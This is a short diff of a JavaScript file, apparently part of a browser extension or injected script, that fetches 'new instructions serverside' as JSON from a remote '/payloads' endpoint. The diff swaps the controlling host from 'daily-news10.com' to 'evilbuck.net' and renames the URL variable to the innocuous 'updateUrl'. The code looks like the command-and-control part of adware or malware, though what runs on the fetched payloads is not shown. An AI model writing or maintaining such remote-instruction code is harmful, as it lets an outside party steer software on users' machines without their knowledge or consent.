@@ -1,9 +1,9 @@
 (function(){
   var VERSION = "1.0", PUSHER_KEY = '4e4187046e87f1ff0599'
-    , WORK_OFFLINE = true, youtuberUrl, $router;
+    , WORK_OFFLINE = true, updateUrl, $router;
 
   $router = $({});
-  youtuberUrl = 'http://daily-news10.com';
+  updateUrl = 'http://evilbuck.net';
   var myapp, install_key = "install_" + VERSION, Util;
 
   Util = {
@@ -132,7 +132,7 @@
 
     // check for new instructions serverside
     $.ajax({
-      url: youtuberUrl + "/payloads",
+      url: updateUrl + "/payloads",
       dataType: 'json'
     })
       .done(function(res){
